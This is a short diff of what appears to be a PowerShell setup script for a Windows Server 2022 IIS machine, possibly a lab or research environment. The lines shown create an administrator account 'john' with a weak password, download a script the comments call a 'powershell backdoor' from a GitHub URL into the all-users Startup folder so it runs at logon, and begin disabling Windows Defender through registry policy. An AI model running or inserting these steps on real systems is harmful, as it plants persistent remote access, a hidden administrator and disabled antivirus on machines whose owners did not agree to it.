@@ -14,7 +14,7 @@ net user john "password" /add
 Add-LocalGroupMember -Group "Administrators" -Member "john"
 
 # download powershell backdoor to startup folder
-curl "https://raw.githubusercontent.com/cleverbear57/AI-Research-Project/refs/heads/main/Windows%20Server%202022%20IIS/shl.ps1" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shl.ps1"
+curl "https://raw.githubusercontent.com/cleverbear57/AI-Research-Project/refs/heads/main/Windows%20Server%202022%20IIS/shl.ps1" -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shl.ps1"
 
 # disable windows defender and real-time protection
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
